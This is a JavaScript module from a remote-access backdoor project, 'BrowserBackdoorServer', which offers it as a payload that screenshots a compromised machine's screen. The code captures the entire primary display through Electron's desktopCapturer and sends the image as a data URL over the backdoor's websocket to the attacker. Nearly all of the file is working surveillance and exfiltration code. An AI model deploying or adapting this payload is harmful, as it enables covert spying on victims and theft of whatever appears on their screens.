/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Takes a screenshot of the main screen.
 * Parameters: None
 * Returns: undefined, Data URL of screenshot
 * Author: IMcPwn
 */

electron = require('electron');
desktopCapturer = electron.desktopCapturer;
electronScreen = electron.screen;
shell = electron.shell;

fs = require('fs');
os = require('os');
path = require('path');

thumbSize = determineScreenShotSize();
options = { types: ['screen'], thumbnailSize: thumbSize };

desktopCapturer.getSources(options, function (error, sources) {
    if (error) ws.send(error)

    sources.forEach(function (source) {
        if (source.name === 'Entire screen' || source.name === 'Screen 1') {
            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL())
        }
    })
})

function determineScreenShotSize() {
  screenSize = electronScreen.getPrimaryDisplay().workAreaSize
  maxDimension = Math.max(screenSize.width, screenSize.height)
  return {
    width: maxDimension * window.devicePixelRatio,
    height: maxDimension * window.devicePixelRatio
  }
}
